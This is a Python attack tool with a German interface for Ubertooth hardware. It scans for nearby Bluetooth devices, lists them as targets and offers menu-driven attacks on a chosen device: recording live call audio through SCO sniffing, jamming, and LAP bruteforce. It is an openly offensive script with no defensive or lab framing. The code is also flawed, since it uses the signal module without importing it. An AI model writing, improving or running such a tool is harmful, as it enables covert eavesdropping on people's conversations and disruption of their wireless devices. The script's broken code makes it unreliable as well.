#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH TARGET MASTER v666 - MIT VOLLER KONTROLLE

import os
import sys
import re
import time
import subprocess
from datetime import datetime
import colorama
from colorama import Fore, Style

colorama.init()

class UberTargetMaster:
    def __init__(self):
        self.targets = []
        self.running = True
        signal.signal(signal.SIGINT, self.cleanup)
        self.check_root()
        self.show_banner()

    def check_root(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}🚫 NUR MIT ROOT! (sudo {sys.argv[0]}){Style.RESET_ALL}")
            sys.exit(1)

    def show_banner(self):
        os.system('clear')
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH TARGET MASTER v666
   • Scannt MACs & Namen •
   • Wähle deinen Angriff •
 ------------------------------------
{Style.RESET_ALL}""")

    def scan_devices(self):
        """Scannt mit ubertooth-scan und hcitool für maximale Details"""
        self.show_banner()
        print(f"{Fore.CYAN}🔍 Scanne Bluetooth-Geräte... (15 Sekunden){Style.RESET_ALL}")
        
        # Ubertooth-Scan für MACs und LAPs
        ubertooth_proc = subprocess.Popen(["ubertooth-scan", "-t", "15"], 
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
        
        # hcitool für Gerätenamen
        hcitool_proc = subprocess.Popen(["hcitool", "scan"], 
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE)
        
        # Parse Ergebnisse
        self.targets = []
        
        # Ubertooth-Ergebnisse (MAC + LAP)
        for line in ubertooth_proc.stdout:
            line = line.decode()
            if 'BD_ADDR' in line:
                mac = re.search(r'(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line)
                lap = re.search(r'LAP: (0x[0-9A-Fa-f]+)', line)
                if mac:
                    self.targets.append({
                        'mac': mac.group(0),
                        'lap': lap.group(1) if lap else 'N/A',
                        'name': 'Unbekannt'
                    })
        
        # hcitool-Ergebnisse (Namen)
        for line in hcitool_proc.stdout:
            line = line.decode()
            if ':' in line:
                parts = line.strip().split('\t')
                if len(parts) >= 2:
                    mac = parts[1]
                    name = parts[2] if len(parts) > 2 else 'Unbekannt'
                    for target in self.targets:
                        if target['mac'].lower() == mac.lower():
                            target['name'] = name
        
        return len(self.targets) > 0

    def show_targets(self):
        """Zeigt gefundene Geräte mit Details"""
        self.show_banner()
        print(f"\n{Fore.GREEN}=== GEFUNDENE ZIELE ==={Style.RESET_ALL}")
        print(f"{Fore.YELLOW}NR.  MAC-ADRESSE       LAP       GERÄTENAME{Style.RESET_ALL}")
        print("-" * 50)
        for i, target in enumerate(self.targets, 1):
            print(f"{i:2}. {target['mac']}  {target['lap']:8}  {target['name']}")

    def attack_menu(self, target):
        """Menü für Angriffsoptionen"""
        while True:
            self.show_banner()
            print(f"\n{Fore.RED}🎯 AUSGEWÄHLTES ZIEL: {target['mac']}{Style.RESET_ALL}")
            print(f"Name: {target['name']} | LAP: {target['lap']}")
            print(f"\n{Fore.CYAN}=== ANGRIFFSOPTIONEN ==={Style.RESET_ALL}")
            print("1. Live-Audio abhören (SCO Sniffing)")
            print("2. Gezieltes Jamming")
            print("3. LAP Bruteforce")
            print("4. Zurück zur Zielliste")
            
            choice = input("\nWÄHLE ANGRIFFSTYP: ")
            
            if choice == "1":
                self.sco_sniff(target)
            elif choice == "2":
                self.jam_target(target)
            elif choice == "3":
                self.bruteforce_lap(target)
            elif choice == "4":
                break
            else:
                print(f"{Fore.RED}Ungültige Eingabe!{Style.RESET_ALL}")

    def sco_sniff(self, target):
        """SCO Audio mitschneiden"""
        filename = f"audio_{target['mac'].replace(':', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        print(f"{Fore.RED}🎙️ Starte Audio-Aufnahme... (Stop mit Enter){Style.RESET_ALL}")
        proc = subprocess.Popen(f"ubertooth-bt -S -t {target['mac']} -c {filename}",
                              shell=True,
                              preexec_fn=os.setsid)
        input()
        proc.kill()
        print(f"{Fore.GREEN}✔ Aufnahme gespeichert als: {filename}{Style.RESET_ALL}")

    def jam_target(self, target):
        """Zielgerät jammen"""
        print(f"{Fore.RED}📶 Starte Jamming von {target['mac']}... (Stop mit Enter){Style.RESET_ALL}")
        proc = subprocess.Popen(f"ubertooth-jam -b -t {target['mac']}",
                              shell=True,
                              preexec_fn=os.setsid)
        input()
        proc.kill()

    def bruteforce_lap(self, target):
        """LAP Bruteforce"""
        print(f"{Fore.RED}🔓 Starte LAP Bruteforce für {target['mac']}...{Style.RESET_ALL}")
        os.system(f"ubertooth-bt -l {target['lap']} -B -f")

    def cleanup(self, sig=None, frame=None):
        print(f"\n{Fore.RED}🛑 Beende alle Prozesse...{Style.RESET_ALL}")
        os.system("pkill -f 'ubertooth|hcitool'")
        sys.exit(0)

    def main(self):
        while self.running:
            if not self.targets:
                if not self.scan_devices():
                    print(f"{Fore.RED}Keine Geräte gefunden!{Style.RESET_ALL}")
                    time.sleep(2)
                    continue
            
            self.show_targets()
            print(f"\n{Fore.YELLOW}X. Neu scannen{Style.RESET_ALL}")
            print(f"{Fore.RED}Q. Beenden{Style.RESET_ALL}")
            
            choice = input("\nWähle Ziel (1-9/X/Q): ").upper()
            
            if choice == "X":
                self.targets = []
            elif choice == "Q":
                self.running = False
            elif choice.isdigit() and 1 <= int(choice) <= len(self.targets):
                self.attack_menu(self.targets[int(choice)-1])
            else:
                print(f"{Fore.RED}Ungültige Auswahl!{Style.RESET_ALL}")

if __name__ == "__main__":
    # Abhängigkeiten prüfen
    required = ['ubertooth-scan', 'hcitool', 'ubertooth-bt']
    missing = [cmd for cmd in required if not subprocess.getoutput(f"which {cmd}")]
    if missing:
        print(f"{Fore.RED}Fehlende Tools: {', '.join(missing)}{Style.RESET_ALL}")
        sys.exit(1)
    
    app = UberTargetMaster()
    try:
        app.main()
    except Exception as e:
        print(f"{Fore.RED}Fehler: {e}{Style.RESET_ALL}")
    finally:
        app.cleanup()
